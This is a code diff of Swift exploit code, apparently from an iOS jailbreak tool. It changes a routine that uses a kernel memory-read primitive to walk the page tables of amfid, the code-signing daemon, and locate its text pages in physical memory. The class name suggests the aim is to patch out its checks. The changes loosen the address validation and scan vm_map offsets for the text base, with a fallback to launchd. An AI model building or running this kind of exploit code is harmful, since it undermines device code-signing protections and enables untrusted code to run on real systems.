@@ -582,18 +582,27 @@ final class ExpAmfidNopFinal {
         
         // pmap → ttep (translation table entry pointer, offset 0x0)
         let ttep = ds_kread64(pmap + 0x0)
-        guard ttep != 0 && ttep > 0x100000000 && ttep < 0xA00000000 && (ttep & 0xFFF) == 0 else {
+        // ttep can be kernel VA (0xfffffff0xx) or physical — both readable via ds_kread64
+        let ttepIsKernVA = (ttep >> 32) > 0xFFFFFF00
+        let ttepIsPhys = ttep > 0x100000000 && ttep < 0xA00000000 && (ttep & 0xFFF) == 0
+        guard ttep != 0 && (ttepIsKernVA || ttepIsPhys) else {
             log("❌ ttep invalid: 0x\(String(format:"%llx", ttep))")
-            log("   Expected page-aligned physical address")
             fallbackToLaunchd(amfidPid: amfidPid)
             return
         }
-        log("  ttep: 0x\(String(format:"%llx", ttep))")
+        log("  ttep: 0x\(String(format:"%llx", ttep)) (\(ttepIsKernVA ? "kernVA" : "phys"))")
         
-        // Get amfid's text base from vm_map min_offset
-        let textBase = ds_kread64(vmMap + 0x10)
-        guard textBase >= 0x100000000 && textBase < 0x280000000000 else {
-            log("❌ text base invalid: 0x\(String(format:"%llx", textBase))")
+        // Get amfid's text base — scan vm_map for userspace address
+        var textBase: UInt64 = 0
+        for off: UInt64 in [0x10, 0x18, 0x20, 0x28, 0x30] {
+            let val = ds_kread64(vmMap + off)
+            if val >= 0x100000000 && val < 0x280000000000 {
+                textBase = val
+                break
+            }
+        }
+        guard textBase != 0 else {
+            log("❌ text base not found in vm_map")
             fallbackToLaunchd(amfidPid: amfidPid)
             return
         }
@@ -610,9 +619,14 @@ final class ExpAmfidNopFinal {
         
         log("  L1[\(l1Idx)] L2[\(l2Idx)] L3[\(l3Idx)] off=0x\(String(format:"%x", pageOff))")
         
-        // L1 — read from physical memory (ttep is physical)
+        // Helper: validate address is readable (kernel VA or physical in DRAM)
+        func isReadable(_ addr: UInt64) -> Bool {
+            return (addr >> 32) > 0xFFFFFF00 || (addr > 0x100000000 && addr < 0xA00000000)
+        }
+        
+        // L1
         let l1Addr = ttep + l1Idx * 8
-        guard l1Addr > 0x100000000 && l1Addr < 0xA00000000 else {
+        guard isReadable(l1Addr) else {
             log("❌ L1 addr out of range: 0x\(String(format:"%llx", l1Addr))")
             fallbackToLaunchd(amfidPid: amfidPid)
             return
@@ -628,7 +642,7 @@ final class ExpAmfidNopFinal {
         
         // L2
         let l2Addr = l2Table + l2Idx * 8
-        guard l2Addr > 0x100000000 && l2Addr < 0xA00000000 else {
+        guard isReadable(l2Addr) else {
             log("❌ L2 addr out of range: 0x\(String(format:"%llx", l2Addr))")
             fallbackToLaunchd(amfidPid: amfidPid)
             return
@@ -644,7 +658,7 @@ final class ExpAmfidNopFinal {
         
         // L3
         let l3Addr = l3Table + l3Idx * 8
-        guard l3Addr > 0x100000000 && l3Addr < 0xA00000000 else {
+        guard isReadable(l3Addr) else {
             log("❌ L3 addr out of range: 0x\(String(format:"%llx", l3Addr))")
             fallbackToLaunchd(amfidPid: amfidPid)
             return
@@ -660,9 +674,9 @@ final class ExpAmfidNopFinal {
         
         log("  physical: 0x\(String(format:"%llx", physAddr))")
         
-        // SAFETY CHECK: verify physical address is in DRAM
-        guard physAddr > 0x100000000 && physAddr < 0xA00000000 else {
-            log("❌ Physical address out of DRAM range!")
+        // SAFETY CHECK: verify physical address is readable
+        guard isReadable(physAddr) else {
+            log("❌ Physical address out of range: 0x\(String(format:"%llx", physAddr))")
             log("   ABORTING — would cause panic")
             fallbackToLaunchd(amfidPid: amfidPid)
             return
